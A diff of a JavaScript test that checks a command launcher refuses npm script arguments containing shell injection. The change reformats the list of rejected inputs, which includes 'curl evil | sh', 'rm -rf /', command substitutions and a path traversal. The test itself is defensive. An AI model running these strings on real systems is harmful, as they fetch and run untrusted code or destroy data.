@@ -20,7 +20,14 @@ describe('what the platform will start', () => {
    * and a script name reaches a process. With a shell it would be two commands.
    */
   it('refuses an argument a shell would read as more than one', () => {
-    for (const arg of ['build; curl evil | sh', 'build && rm -rf /', '$(whoami)', '`id`', 'a b', '../../etc']) {
+    for (const arg of [
+      'build; curl evil | sh',
+      'build && rm -rf /',
+      '$(whoami)',
+      '`id`',
+      'a b',
+      '../../etc',
+    ]) {
       expect(decideCommand('npm', ['run', arg]).ok, arg).toBe(false);
     }
   });
